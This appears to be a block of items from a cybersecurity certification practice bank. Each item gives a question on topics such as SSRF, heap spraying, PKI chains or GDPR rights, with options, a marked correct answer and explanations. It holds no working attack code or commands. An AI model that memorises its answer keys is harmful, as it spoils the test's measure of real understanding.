  {id:603,domain:O,question:"What is the difference between a vulnerability assessment and a risk assessment?",options:["They are the same type of assessment","A vulnerability assessment identifies technical weaknesses in systems; a risk assessment evaluates the potential business impact and likelihood of threats exploiting those weaknesses","Risk assessments are conducted only annually; vulnerability assessments are continuous","Vulnerability assessments are more comprehensive than risk assessments"],answer:1,explanation:"Vulnerability assessments find the 'what' (SQL injection in the web app); risk assessments determine the 'so what' (potential for customer data breach with regulatory and reputational impact).",optionExplanations:["Vulnerability and risk assessments are complementary but distinct processes with different scopes and outputs.","Vulnerability assessment produces a technical list of weaknesses; risk assessment translates those weaknesses into business risk by considering threat likelihood, potential impact, and existing mitigating controls.","Frequency depends on organizational policy; they are distinct types of assessments that can be conducted independently.","Risk assessments are broader in business scope while vulnerability assessments are deeper in technical scope; neither is universally more comprehensive."]},
  {id:604,domain:T,question:"What is a time-of-check to time-of-use (TOCTOU) race condition?",options:["Checking the time before using a system","A security flaw where a security check and the subsequent resource use are not atomic, allowing an attacker to change the resource between check and use","A timing attack on authentication systems","A vulnerability in time synchronization protocols"],answer:1,explanation:"Classic example: a program checks if file is readable, then reads it — attacker swaps a symlink between check and read, causing the program to read a sensitive file with elevated privileges.",optionExplanations:["System time checking is a different operation; TOCTOU is about the security gap between verification and action.","TOCTOU exploits the time gap between verifying a condition (check) and acting on it (use) — the state changes between check and use, invalidating the security verification.","Authentication timing attacks measure response time to guess credentials; TOCTOU is about resource state changes between security checks.","Time synchronization protocol vulnerabilities are different; TOCTOU exploits the non-atomic nature of check-then-use operations."]},
  {id:605,domain:G,question:"What is the role of a trust anchor in PKI?",options:["The most trusted certificate in a hierarchy","A trust anchor is a certificate or public key that is implicitly trusted by the relying party — the root CA certificates in browser trust stores are trust anchors","A trusted third party that anchors business relationships","The lowest trust level in a PKI hierarchy"],answer:1,explanation:"Browsers ship with ~100 trusted root CAs — each is a trust anchor. Compromise of a root CA (like DigiNotar in 2011) undermines trust in all certificates it issued.",optionExplanations:["Trust anchors are at the top of the trust hierarchy; the most trusted certificate IS the trust anchor (root CA).","A trust anchor is a certificate or public key that is accepted as trustworthy without further verification — browser root stores contain the trust anchors that form the basis for all TLS certificate validation.","Business relationship anchoring is a different concept; trust anchors in PKI are cryptographic trust foundations.","Trust anchors are the highest trust level; lower-level certificates derive trust from the anchor through certificate chains."]},
  {id:606,domain:P,question:"What is a legitimate interest assessment (LIA)?",options:["An assessment of a company's market legitimacy","A structured evaluation required before relying on legitimate interest as the legal basis for processing personal data, balancing the organization's interests against individual privacy rights","A legal review of business interests","An interest rate assessment for financial data processing"],answer:1,explanation:"A proper LIA documents the processing purpose, confirms no less-intrusive alternative exists, and demonstrates that privacy-respecting individuals would expect this processing.",optionExplanations:["Market legitimacy is a business concept; LIA is a specific GDPR compliance process.","An LIA involves three stages: purpose test (identifying a genuine, legitimate interest), necessity test (confirming processing is needed), and balancing test (weighing against individuals' interests and rights).","Legal business review is corporate governance; LIA is specific to GDPR's legitimate interest legal basis determination.","Financial interest rates are unrelated; LIA assesses whether the legitimate interest basis applies to personal data processing activities."]},
  {id:607,domain:A,question:"What is network traffic shaping in security?",options:["Physically shaping network cable routes","Controlling the volume and type of network traffic to limit the bandwidth available for certain applications, potentially reducing the effectiveness of bandwidth-consuming attacks","Shaping network policies for different user groups","Optimizing network packet shapes for efficiency"],answer:1,explanation:"Traffic shaping (QoS controls) can limit bandwidth available to DDoS traffic, prioritize critical business traffic during attacks, and restrict high-bandwidth applications from consuming all capacity.",optionExplanations:["Cable routing is physical network design; traffic shaping controls the flow characteristics of network traffic.","Traffic shaping uses rate limiting, QoS queuing, and bandwidth allocation to control traffic flows — limiting the bandwidth attackers or non-critical applications can consume.","User group policies are access control; traffic shaping is specifically about bandwidth and flow characteristics.","Packet structure optimization is network protocol engineering; traffic shaping manages traffic volume and priority."]},
  {id:608,domain:O,question:"What is security metrics benchmarking?",options:["Testing security tool performance benchmarks","Comparing an organization's security metrics against industry peers, standards, or best practices to understand relative performance and identify improvement opportunities","A performance benchmark for security software","Measuring security team performance against competitors"],answer:1,explanation:"Benchmarking shows whether 72-hour average patching time is good or poor for the industry — peer comparison motivates improvement and helps justify security budget to executives.",optionExplanations:["Tool performance testing is vendor evaluation; metrics benchmarking compares organizational security performance.","Security benchmarking uses survey data, industry reports, and maturity models to compare your metrics (patch time, MTTD, click rates) against peers — identifying gaps and best practices.","Software performance benchmarks are capacity planning tools; security metrics benchmarking measures program effectiveness.","Team performance comparison is HR analytics; security metrics benchmarking focuses on technical security outcomes."]},
  {id:609,domain:T,question:"What is a pharming attack's primary defense?",options:["Using antivirus software","DNSSEC implementation, which adds cryptographic signatures to DNS records enabling recipients to verify the integrity and authenticity of DNS responses","Using a VPN service","Enabling two-factor authentication"],answer:1,explanation:"DNSSEC (DNS Security Extensions) signs DNS records so resolvers can detect tampered or forged DNS responses — defeating DNS cache poisoning and pharming at the protocol level.",optionExplanations:["Antivirus doesn't protect against DNS manipulation; DNSSEC addresses the root cause.","DNSSEC adds cryptographic signatures to DNS zones, allowing resolvers to verify that DNS responses haven't been tampered with — preventing the DNS poisoning that enables pharming.","VPNs protect traffic routing but don't prevent DNS poisoning at the resolver level; DNSSEC is the protocol-level defense.","2FA protects accounts after credential entry on a phishing site; DNSSEC prevents victims from reaching the malicious site by protecting DNS integrity."]},
  {id:610,domain:G,question:"What is a cryptographic hash collision?",options:["When two encryption algorithms produce the same result","When two different input values produce identical hash output, potentially enabling digital signature forgery and integrity check bypass","A mathematical error in hash computation","When a hash function produces the same output repeatedly"],answer:1,explanation:"SHA-1 collision was demonstrated in 2017 (SHAttered) — two different PDF files with identical SHA-1 hashes. This enabled forged digital signatures, leading to SHA-1 deprecation.",optionExplanations:["Different algorithms producing the same result is a different concept; collision is about a single algorithm producing the same hash for different inputs.","A collision defeats hash function properties — if two messages share a hash, a signature on one is also valid for the other, enabling document forgery without breaking the underlying cryptography.","Mathematical errors produce incorrect outputs; collisions are when a function correctly produces the same output for different inputs.","Repeated same output could indicate a broken RNG; hash collisions are when different inputs map to the same digest value."]},
  {id:611,domain:T,question:"What is a network worm?",options:["A tool for monitoring network traffic","Self-replicating malware that spreads across networks by exploiting vulnerabilities without requiring user interaction, consuming bandwidth and system resources","A network cable management solution","A physical insect affecting network infrastructure"],answer:1,explanation:"WannaCry used the EternalBlue SMB exploit to self-propagate across networks — infecting unpatched systems without any user action, creating massive parallel ransomware outbreaks.",optionExplanations:["Network traffic monitoring is a security monitoring function; worms are malware that self-propagate.","Network worms autonomously scan for vulnerable systems, exploit them, and copy themselves to the new host — potentially infecting millions of systems in hours without any user interaction.","Cable management is physical infrastructure; worms are malicious self-replicating software.","Physical insects affecting cabling are physical security issues; network worms are malicious software."]},
  {id:612,domain:A,question:"What is vulnerability scanning vs. penetration testing?",options:["They are the same process with different names","Vulnerability scanning automatically identifies potential weaknesses; penetration testing manually exploits those weaknesses to demonstrate actual impact and risk","Scanning is more thorough than penetration testing","Penetration testing is performed only by automated tools"],answer:1,explanation:"Scanning finds potential vulnerabilities (false positives possible); penetration testing confirms exploitability and impact (false positive elimination, actual risk demonstration).",optionExplanations:["Vulnerability scanning and penetration testing are distinct activities with different outputs and purposes.","Scanners (Nessus, Qualys) find potential vulnerabilities using signatures and checks; penetration testers manually exploit vulnerabilities to prove they're real and demonstrate business impact.","Penetration testing is more thorough in demonstrating impact; scanning covers more systems quickly. Neither is universally more thorough.","Penetration testing involves skilled human testers; it's not automated — automation tools support testers but cannot replace the creativity and judgment of skilled humans."]},
  {id:613,domain:O,question:"What is an information security management system (ISMS)?",options:["A system for managing security software","A systematic framework for establishing, implementing, maintaining, and improving information security based on risk management — ISO 27001 defines ISMS requirements","A management interface for security tools","A system for tracking security incidents"],answer:1,explanation:"An ISMS (ISO 27001) provides governance structure: policies, risk management, asset management, controls, incident management, and continual improvement through PDCA cycles.",optionExplanations:["Security software management is IT operations; an ISMS is the overarching security management framework.","ISO 27001 defines ISMS requirements — governance, risk assessment, control selection, documentation, measurement, and management review — creating a comprehensive, auditable security management system.","Security tool interfaces are individual systems; an ISMS is the governance framework governing all security activities.","Incident tracking is one ISMS component; the ISMS encompasses the entire security management lifecycle."]},
  {id:614,domain:P,question:"What is data residency?",options:["Where data 'resides' in a database schema","Requirements specifying that personal data must be physically stored within specific geographic boundaries or jurisdictions, often driven by local laws","How long data remains in a system","The residence address of data subjects"],answer:1,explanation:"Data residency requirements (Russia's Federal Law 149-FZ, China's data localization laws) require personal data to be stored on servers located within the country — affecting multinational cloud deployments.",optionExplanations:["Database schema location is data architecture; residency concerns the physical geographic location of storage.","Data residency requirements mandate that data be stored within specific countries or regions — affecting cloud deployment decisions, data center locations, and multinational data management strategies.","Storage duration is data retention; residency concerns geographic location of storage.","Subject addresses are personal data; data residency refers to where the organization must physically store data about those subjects."]},
  {id:615,domain:G,question:"What is a certificate chain of trust?",options:["A chain of physical certificates","The hierarchical structure from root CA through intermediate CAs to end-entity certificates, where each certificate is signed by the one above it, establishing trustworthiness through verified signatures","A list of trusted certificates in a browser","A network chain for certificate distribution"],answer:1,explanation:"Browsers trust root CAs → root CAs sign intermediate CAs → intermediate CAs sign website certificates — the chain enables trust without having every website cert directly signed by a root CA.",optionExplanations:["Physical certificate chains don't exist in PKI; the chain is a cryptographic trust hierarchy.","A certificate chain works by having each certificate signed by a CA above it in the hierarchy — browsers verify the entire chain up to a trusted root, ensuring each certificate derives trust from a verified source.","Browser trust stores contain root CA certificates; the chain of trust is the hierarchical structure connecting those roots to individual website certificates.","Certificate distribution networks are CDN-like infrastructure; the chain of trust is a cryptographic verification structure."]},
  {id:616,domain:T,question:"What is a blended threat?",options:["An attack exclusively using multiple coordinated network-layer techniques such as flood traffic and protocol exploitation to simultaneously overwhelm different infrastructure components","An attack combining multiple attack techniques (malware, exploit, social engineering) to compromise security in ways a single technique alone couldn't achieve","An attack that simultaneously targets both physical access controls and digital network infrastructure, requiring attackers to coordinate across physical and cyber domains","A coordinated campaign where multiple distinct threat actor groups independently target the same organization at the same time without sharing tools, access, or intelligence with each other"],answer:1,explanation:"Modern APT attacks blend spear phishing (delivery) with zero-day exploits (installation) with legitimate tools (persistence) with encrypted C2 (communication) — no single control addresses all aspects.",optionExplanations:["Multiple network layer attacks describe volumetric or protocol DDoS techniques; blended threats combine fundamentally different attack categories like malware, social engineering, and exploit code.","Blended threats use multiple techniques in combination — phishing delivers a macro that exploits an Office vulnerability, installs a Cobalt Strike beacon, uses legitimate tools for lateral movement, and exfiltrates through DNS tunneling.","Hybrid physical-digital attacks are a related concept but differ from blended threats, which specifically combine multiple distinct digital attack techniques like malware delivery, exploits, and social engineering.","Multiple simultaneous independent threat actors describe coincidental or parallel campaigns; blended threats are a single coordinated attack combining diverse techniques — not multiple unrelated attackers."]},
  {id:617,domain:A,question:"What is a secure coding standard?",options:["A compliance framework specifying physical and logical security requirements for software development environments, including workstation hardening, code repository access controls, and CI/CD pipeline protection","Defined rules and guidelines for developers to follow when writing code to prevent common security vulnerabilities, such as OWASP, CERT, or CWE standards","A regulatory standard specifying minimum hardware security configurations, full-disk encryption settings, screen-lock timeouts, and removable media controls for developer workstations handling sensitive source code","A professional certification awarded to software developers who pass a vendor-neutral security exam, demonstrating knowledge of threat modeling, secure architecture, cryptography, and application security testing"],answer:1,explanation:"OWASP Top 10 coding guidance, CERT Secure Coding Standards, and CWE (Common Weakness Enumeration) provide specific rules preventing SQL injection, buffer overflows, and other common vulnerabilities.",optionExplanations:["Development environment security frameworks address infrastructure security; secure coding standards govern the code itself — the rules developers follow to avoid writing vulnerable code in the first place.","Secure coding standards like CERT C/C++ or OWASP provide concrete rules: always use parameterized queries, never use gets(), validate all input, handle errors securely — preventing classes of vulnerabilities.","Developer workstation security standards address endpoint hardening; secure coding standards govern the software being written — rules like parameterized queries, input validation, and error handling practices.","Security certifications like CSSLP validate developer knowledge; secure coding standards are the specific technical rules and practices developers follow to prevent vulnerabilities in the code they write."]},
  {id:618,domain:O,question:"What is a network flow record (NetFlow, IPFIX)?",options:["A structured log documenting physical Ethernet cable runs, patch panel connections, and conduit routes throughout a facility, used by network engineers for infrastructure change management and documentation","Aggregated network communication data capturing source/destination IPs, ports, protocols, bytes, and timing without capturing payload content — used for network visibility and security analysis","A visual network topology diagram depicting the physical paths that traffic takes between buildings, floors, and data centers, used by network architects for capacity planning and infrastructure documentation","Full packet capture data that includes the complete payload of every frame traversing a network segment, written to disk at wire speed for deep content inspection and forensic analysis"],answer:1,explanation:"Flow records (NetFlow, sFlow, IPFIX) enable 'who talked to whom, when, and how much' analysis at scale — impossible with full packet capture but sufficient to detect C2 beaconing, scanning, and data exfiltration.",optionExplanations:["Physical cable routing logs are infrastructure documentation maintained by facilities teams; flow records are automatically generated metadata about network communications between IP endpoints.","Flow records capture communication metadata — IP addresses, ports, bytes transferred, duration — providing visibility into network behavior patterns without the storage cost of full packet capture.","Physical traffic path diagrams are network topology documentation; flow records are automatically collected metadata capturing real-time communication statistics without representing physical infrastructure layout.","Full packet capture includes payload content and can reconstruct session data; flow records capture only communication metadata — IPs, ports, byte counts, and timing — without storing payload content."]},
  {id:619,domain:P,question:"What is the right to restriction of processing under GDPR?",options:["The GDPR right for individuals to withdraw consent at any time, immediately requiring organizations to cease all further collection and active processing of that person's personal data going forward","An individual's right to request that processing of their personal data is limited while a dispute about accuracy, lawfulness, or objection is resolved","A GDPR principle requiring organizations to proactively define and enforce maximum retention schedules for personal data categories, automatically purging records once the defined retention period has expired","A GDPR right enabling individuals to designate which specific employees within an organization are authorized to access, view, or process their stored personal data records on an ongoing basis"],answer:1,explanation:"GDPR Article 18 allows data subjects to have their data 'frozen' during disputes — the data can't be deleted or further processed until the restriction is lifted.",optionExplanations:["Consent withdrawal stops future processing based on consent; restriction of processing temporarily pauses all processing of already-collected data while a specific dispute about accuracy or lawfulness is being investigated.","Restriction of processing means the organization cannot process the data (except store it) while a dispute is pending — the data is 'quarantined' from use during investigation of a complaint or inaccuracy claim.","Storage limitation governs how long data can be retained; restriction of processing is a separate right that temporarily freezes how existing data can be used while a dispute or complaint is being resolved.","Controlling internal access permissions is an organizational data governance matter; restriction of processing is a data subject right that pauses the controller's ability to use the data during a pending dispute."]},
  {id:620,domain:G,question:"What is an end-entity certificate?",options:["A TLS server certificate issued to the terminal application tier in a multi-tier web architecture, used exclusively to authenticate and encrypt API calls between application servers in the backend layer","The certificate issued to a specific entity (web server, person, device) at the bottom of the PKI trust hierarchy, which cannot sign other certificates","A specialized X.509 certificate with an extended key usage extension that restricts its use exclusively to protecting email message confidentiality and integrity via the S/MIME protocol","A certificate in a PKI hierarchy that has been placed on administrative hold by the issuing CA, preventing revocation processing until a formal review determines whether permanent revocation is warranted"],answer:1,explanation:"End-entity (leaf) certificates are issued to specific subjects (websites, users, code signing) and are constrained from signing other certificates — unlike intermediate CAs which can issue certificates.",optionExplanations:["Backend API certificates are end-entity certificates but the term specifically describes the leaf position in the PKI hierarchy — any certificate issued to a specific subject that cannot sign other certificates.","End-entity certificates are constrained with 'CA:false' in the Basic Constraints extension — they identify a specific entity (website, person, device) and cannot be used to issue further certificates.","S/MIME email certificates are one type of end-entity certificate; end-entity certificates encompass all leaf certificates including web server, code signing, client authentication, and device certificates.","Certificate hold status is a temporary revocation state; end-entity certificates are defined by their position at the bottom of the trust hierarchy and their inability to sign or issue other certificates."]},
  {id:621,domain:O,question:"What is a security assessment scope?",options:["The physical territory and response jurisdiction assigned to a security team, defining which building zones, parking areas, and perimeter sections fall under their patrol routes and surveillance responsibility","The defined boundaries of a security assessment specifying what systems, networks, applications, and tests are included or excluded — preventing unauthorized testing","The organizational division of security responsibilities across teams, defining which group owns firewalls, identity management, endpoint security, cloud security, and application security within the enterprise","The geographic and network regions from which a SIEM platform collects log data, defining which endpoints, servers, network devices, and applications feed telemetry into the security operations center"],answer:1,explanation:"Scope defines what's authorized — testing systems outside scope is unauthorized access. Scoping must be explicit in writing to protect testers legally and focus testing efforts.",optionExplanations:["Physical patrol territories are physical security planning; assessment scope is a formal legal boundary document authorizing specific penetration testing or audit activities against defined digital targets.","Assessment scope formally authorizes specific testing activities against defined targets — unsigned scope documents leave testers legally exposed and testing may disrupt out-of-scope business systems.","Organizational RACI charts define team responsibilities; security assessment scope is the specific authorized boundary for a particular engagement — defining what can be tested, not who manages what.","SIEM coverage defines monitoring visibility; assessment scope is the authorized boundary for active testing — defining what systems testers may probe, attack, or enumerate without constituting unauthorized access."]},
  {id:622,domain:T,question:"What is a supply chain attack vector distinction from other attacks?",options:["Attackers physically intercept goods in transit and tamper with hardware components, network devices, or firmware before delivery, inserting malicious implants during the shipping phase between manufacturer and buyer","Attackers compromise trusted software, hardware, or services that targets rely on and install/use, exploiting the trust relationship between vendors and customers","Attackers launch simultaneous coordinated campaigns against multiple competing suppliers in the same industry segment, aiming to degrade an entire product category's security posture rather than targeting one victim","Attackers compromise an organization's procurement department or vendor payment systems to intercept and redirect financial transactions, diverting invoice payments to fraudulent accounts controlled by threat actors"],answer:1,explanation:"Supply chain attacks are uniquely powerful because they exploit trust — targets don't scrutinize software from their trusted vendors the same way they'd scrutinize unknown software.",optionExplanations:["Physical hardware interdiction during shipping is a hardware supply chain attack; the defining characteristic of software supply chain attacks is exploiting trusted vendor relationships through compromised code or services.","Supply chain attacks (SolarWinds, XZ Utils, NPM package hijacking) reach final targets through vendors those targets trust and install software from — bypassing normal security scrutiny.","Targeting multiple suppliers simultaneously describes a broad campaign; the distinguishing characteristic is exploiting the trust relationship customers place in trusted software vendors — not the breadth of suppliers targeted.","Financial fraud through procurement is business email compromise; supply chain attacks exploit the technical trust customers place in software, hardware, or services their vendors provide and they install."]},
  {id:623,domain:A,question:"What is a software bill of materials (SBOM)?",options:["An itemized financial invoice detailing software licensing fees, maintenance subscription costs, and integration service charges associated with all commercial software products an organization has procured","A formal, machine-readable inventory of all components, dependencies, and licenses in a software product — enabling vulnerability management and license compliance","A list of development tools, compilers, integrated development environments, and software frameworks that a development team has procured and installed on their workstation build environments","An itemized invoice submitted by a third-party security firm detailing penetration testing hours, vulnerability assessment deliverables, and remediation consulting fees charged for a software security engagement"],answer:1,explanation:"Biden's 2021 Executive Order required SBOMs for federal software — Log4Shell demonstrated why: organizations couldn't tell which of their products used Log4j without an SBOM.",optionExplanations:["Software procurement invoices are financial records; an SBOM is a technical inventory of software components, libraries, and dependencies that enable vulnerability identification and license compliance auditing.","An SBOM lists every library, framework, and dependency used in software, enabling rapid identification of which products are affected by newly disclosed vulnerabilities in specific components.","Build environment tool inventories are IT asset records; SBOMs document the components embedded within finished software products — the libraries, open-source packages, and dependencies shipped to customers.","Security assessment invoices are vendor billing records; an SBOM is a technical transparency document listing every dependency in a software product to support vulnerability management and supply chain risk."]},
  {id:624,domain:P,question:"What is cross-border data transfer under GDPR's adequacy decision?",options:["A network engineering determination that available bandwidth, latency, and throughput between two geographically separated data centers is sufficient to support anticipated cross-border data replication workloads","A formal decision by the European Commission that a third country provides an adequate level of data protection, enabling personal data transfer without additional safeguards","An internal self-assessment performed by an organization concluding that its existing technical and administrative controls meet an appropriate security level for conducting international personal data transfers","A mutual legal assistance treaty negotiated bilaterally between two individual nations to facilitate law enforcement evidence sharing and compel cross-border disclosure of electronic data in criminal investigations"],answer:1,explanation:"EU adequacy decisions (UK, Japan, Canada, etc.) permit free data flow similar to within the EU — without adequacy, organizations need SCCs, BCRs, or other transfer mechanisms.",optionExplanations:["Bandwidth capacity decisions are network engineering concerns; adequacy decisions are formal European Commission legal determinations about whether a third country's data protection framework is equivalent to GDPR standards.","The European Commission evaluates whether a country's legal framework provides equivalent protection to GDPR — if adequate, personal data can flow there freely; if not, additional safeguards are required.","Self-assessed data security levels are internal compliance reviews; adequacy decisions are formal European Commission rulings about a country's entire legal data protection framework, not individual organization assessments.","MLATs facilitate law enforcement cooperation; adequacy decisions are European Commission determinations allowing commercial personal data transfers between the EU and countries providing equivalent data protection levels."]},
  {id:625,domain:G,question:"What is a digital certificate's validity period?",options:["The elapsed time since a digital certificate was first issued by the certificate authority, tracked by browsers and TLS libraries to flag excessively old certificates as potentially untrustworthy","The timeframe specified in the certificate during which it is considered valid by relying parties, after which it must be renewed — typically 1 year for DV certificates","The time remaining before an asymmetric private key associated with a TLS certificate reaches its mandatory rotation date per organizational key management policy or industry best practice guidelines","The contracted service window during which a certificate authority commits to responding to certificate status queries, processing revocation requests, and providing technical support to certificate holders"],answer:1,explanation:"Short validity periods (industry moving to 90-day certificates) limit exposure if a key is compromised — an expired certificate is rejected even without revocation.",optionExplanations:["Age since issuance is not embedded in certificates; validity periods are defined by specific notBefore and notAfter timestamps embedded in the certificate structure, independent of how long it has actually been in use.","Certificate validity specifies the 'notBefore' and 'notAfter' dates — clients reject certificates outside this window. The industry is reducing periods to improve revocation effectiveness.","Private key rotation schedules are separate organizational policies; certificate validity periods are cryptographically defined windows embedded in the certificate itself specifying when relying parties should accept it.","CA service level agreements cover support commitments; certificate validity is the cryptographically enforced window embedded in the certificate itself, not the CA's support commitment period."]},
  {id:626,domain:T,question:"What is a SSRF (Server-Side Request Forgery)?",options:["A server-side error condition that occurs when cloud object storage services such as AWS S3 or Azure Blob Storage reject requests with 403 Forbidden responses due to misconfigured bucket policies","A web vulnerability where an attacker causes the server to make HTTP requests to arbitrary URLs — often used to access internal services not exposed to the internet","A server-side access control mechanism that evaluates outbound HTTP requests generated by web application code against an allowlist of permitted destinations before dispatching them to the network","A secure coding design pattern requiring developers to validate all server-initiated HTTP requests against an approved destination allowlist before dispatch, preventing unauthorized outbound connections from backend services"],answer:1,explanation:"SSRF in cloud environments is especially dangerous — attackers can query cloud metadata endpoints (169.254.169.254) to steal IAM credentials, as in the 2019 Capital One breach.",optionExplanations:["Storage service authorization failures are configuration errors; SSRF is a vulnerability class where an attacker manipulates server-side code to cause it to make arbitrary HTTP requests to attacker-specified destinations.","SSRF tricks the server into making requests on the attacker's behalf — bypassing firewalls that block direct external access to internal services, enabling access to internal APIs, metadata services, and administrative interfaces.","Outbound request allowlisting is the mitigation control for SSRF; the vulnerability itself occurs when such controls are absent, allowing attackers to cause servers to make requests to arbitrary internal or external URLs.","Validating server-side requests is the SSRF defense pattern; SSRF the vulnerability describes what happens when this validation is absent and attackers can cause servers to contact arbitrary internal service endpoints."]},
  {id:627,domain:A,question:"What is identity federation?",options:["A consortium of multiple independent organizations that collaborate on shared threat intelligence standards, joint incident response procedures, and mutual security commitments under a formal governance framework","A system allowing users to use a single set of credentials from one organization to access resources in other organizations, based on established trust between identity providers","A process that consolidates multiple separate user accounts from different enterprise directories into a single canonical identity record, eliminating duplicate accounts and simplifying access control administration","A governance approach that synchronizes authorization policies across multiple organizations so all member entities enforce consistent access control decisions for resources shared between partnering companies"],answer:1,explanation:"SAML and OIDC enable federation — a university student uses their university login to access a partner research institution's resources without a separate account.",optionExplanations:["Security information sharing consortia are threat intelligence partnerships; identity federation is specifically the technical capability enabling users to authenticate once and access resources across multiple trusting organizations.","Identity federation trusts the authentication performed by another identity provider — users authenticate once to their home IdP, and federated services accept that authentication assertion.","Identity consolidation or account linking merges duplicate records; identity federation preserves separate identity stores at each organization but establishes trust relationships enabling cross-organizational authentication.","Policy synchronization addresses authorization rules; identity federation addresses authentication — enabling users to present credentials from their home identity provider to access resources at federated partner organizations."]},
  {id:628,domain:O,question:"What is a risk treatment option in cybersecurity?",options:["Psychological support services and employee assistance programs provided to security operations center analysts experiencing burnout, secondary trauma, or stress from handling major data breaches and cyber incidents","The decision about how to handle an identified risk — options include risk acceptance, risk avoidance, risk mitigation (control implementation), and risk transfer (insurance)","A structured incident response procedure developed by the security team that details containment, eradication, and recovery steps for a specific category of confirmed security incident","A risk management philosophy that applies an identical standard set of security controls to every identified risk regardless of the specific likelihood, potential impact, or cost-effectiveness of mitigation"],answer:1,explanation:"Risk transfer (cyber insurance) shifts financial impact; avoidance eliminates the risky activity; mitigation reduces probability or impact; acceptance is conscious tolerance of residual risk.",optionExplanations:["Employee mental health support is an HR function; risk treatment is the formal risk management decision process choosing among risk acceptance, avoidance, mitigation through controls, or transfer through insurance.","After identifying and assessing risks, organizations must decide: accept (tolerate it), avoid (stop the risky activity), mitigate (implement controls to reduce), or transfer (insurance, contracts) the risk.","Incident response plans address active security incidents; risk treatment is the proactive decision-making process for handling identified risks before they materialize into incidents.","Uniform control application ignores risk-based prioritization; risk treatment selects the most appropriate response — accept, avoid, mitigate, or transfer — based on each risk's unique characteristics and business context."]},
  {id:629,domain:T,question:"What is a physical security attack known as shoulder surfing?",options:["Casually glancing at a colleague's desk or monitor to observe what documents or projects they are currently working on during normal office hours","Observing a user's screen, keyboard, or input device without their knowledge to steal passwords, PINs, or sensitive information","A physical penetration technique where an attacker leverages another person's physical body as support to scale a fence, wall, or other physical barrier to gain unauthorized access to secured areas","A physical security attack that tampers with overhead surveillance cameras mounted at shoulder height on building walls to create exploitable blind spots in the physical security monitoring coverage"],answer:1,explanation:"Shoulder surfing is especially effective at ATMs, airports, and coffee shops — privacy screens (polarizing filters), position awareness, and cover when typing PINs are countermeasures.",optionExplanations:["Casual observation of a coworker's work is not a security attack; shoulder surfing involves deliberately and covertly observing a target's screen, keyboard, or input device to steal credentials or sensitive data.","Shoulder surfing directly observes what users type or view — getting close behind a victim at an ATM, sitting adjacent on an airplane, or using binoculars or cameras at distance.","Using someone physically to climb barriers is a different access technique; shoulder surfing is a visual observation attack targeting what a victim types or views on their screen or keypad.","Tampering with surveillance cameras is a physical security attack against the monitoring infrastructure; shoulder surfing is a passive observation technique targeting a victim's screen or keyboard input."]},
  {id:630,domain:G,question:"What is a preimage attack in cryptography?",options:["A technique that generates a low-resolution thumbnail or visual preview of an encrypted file container without decrypting the actual contents, used by content management systems for quick browsing","An attack where given a hash output, the attacker finds an input that produces that hash — defeating hash function security if feasible","An image preprocessing technique applied to data before encryption, converting content into a compressed or normalized format to reduce ciphertext size and improve transmission efficiency over bandwidth-limited channels","An exploit technique that measures precise timing differences between encryption operations on different plaintext inputs to infer information about the key or plaintext through statistical analysis"],answer:1,explanation:"Preimage resistance means finding any input that hashes to a given output should be computationally infeasible — a broken hash function enables forging signatures without the private key.",optionExplanations:["Thumbnail generation for encrypted containers is a file management feature; preimage attacks are cryptanalytic attacks targeting hash functions — finding an input that produces a given hash output.","A preimage attack finds an input m such that hash(m) = target_hash — breaking one-wayness. A second preimage attack finds a different input producing the same hash as a specific known input.","Pre-encryption image compression is a data preparation step; preimage attacks target hash function one-wayness — finding any input whose hash matches a known target hash value without knowing the original input.","Timing-based cryptanalysis is a side-channel attack; preimage attacks are purely mathematical attacks on hash function properties — finding an input that produces a specified hash output without timing observations."]},
  {id:631,domain:O,question:"What is a cyber kill chain's 'Actions on Objectives' phase?",options:["Routine administrative security operations performed by IT and security staff, including patch management, vulnerability scanning, user account provisioning, and policy reviews during normal business operations","The final phase where attackers achieve their ultimate goal — data exfiltration, system destruction, ransomware deployment, or espionage — after establishing persistent access","Post-breach legal proceedings and litigation initiated by organizations against identified threat actors seeking financial damages, injunctive relief, or criminal prosecution following a confirmed cyber intrusion","Post-containment remediation steps executed by the incident response team, including system reimaging, credential resets, firewall rule updates, and security control enhancements after a breach is contained"],answer:1,explanation:"APT attackers may spend months in earlier kill chain phases before executing their final objective — detecting attacks in earlier phases is critical to preventing the most damaging outcomes.",optionExplanations:["Routine administrative tasks are ongoing IT operations; Actions on Objectives is the seventh kill chain phase where attackers execute their primary goal after gaining persistent access — exfiltration, destruction, or espionage.","Actions on Objectives is the seventh and final kill chain phase — where attackers execute their actual goals: stealing intellectual property, encrypting files for ransom, destroying data, or establishing long-term espionage access.","Legal proceedings following breaches are post-incident organizational responses; Actions on Objectives describes the attacker's perspective — the final kill chain phase where they accomplish their primary mission goal.","Post-containment remediation is incident response work performed by defenders; Actions on Objectives is an attacker-perspective kill chain phase describing when attackers achieve their ultimate goal after establishing access."]},
  {id:632,domain:T,question:"What is a heap spray attack?",options:["The physical application of anti-static protective spray coatings to server motherboards, RAM modules, and rack-mounted equipment to prevent electrostatic discharge damage to sensitive electronic components","A technique that places shellcode in a large area of heap memory, increasing the probability that a memory corruption exploit will redirect execution into the attacker's code","A technique that distributes slightly varied exploit payload versions across many different heap memory allocations, hoping that one variant successfully bypasses a specific memory protection mechanism","A memory denial-of-service technique targeting managed language runtimes by triggering rapid large object allocations that exhaust available heap space, preventing garbage collection from reclaiming sufficient memory"],answer:1,explanation:"Heap sprays fill memory with NOP sleds leading to shellcode — making precise address prediction unnecessary by creating a large landing zone for overflowed pointers.",optionExplanations:["Anti-static coating application is a physical hardware protection measure; heap spraying is a software exploitation technique that fills heap memory with shellcode to improve the odds of successful memory corruption exploits.","Heap spraying allocates many objects containing shellcode (preceded by NOP sleds) to fill heap memory, making it likely that a corrupted pointer will eventually land in attacker-controlled shellcode.","Distributing varied payloads describes a different evasion technique; heap spraying fills large contiguous areas of heap memory with a single shellcode pattern to increase the probability that corrupted pointers land in attacker code.","Heap exhaustion attacks cause denial of service; heap spraying places attacker shellcode throughout heap memory to increase the probability that a memory corruption exploit successfully redirects execution to attacker-controlled code."]},
